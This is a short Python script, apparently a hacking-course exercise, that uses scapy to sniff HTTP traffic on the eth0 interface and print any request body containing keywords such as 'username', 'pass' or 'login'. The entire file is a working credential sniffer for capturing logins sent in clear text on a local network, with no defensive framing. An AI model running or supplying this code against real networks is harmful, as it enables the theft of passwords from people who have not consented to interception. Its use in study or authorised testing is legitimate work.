#check for every possibility of username and password keywords

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
           load = packet[scapy.Raw].load
           keywords = ["uname", "pass", "username", "password", "login"]
           for keyword in keywords:
               if keyword in load: #username is substring
                print(load)         #it will print two times
                break                #come out if atleast one keyword is found

sniff("eth0")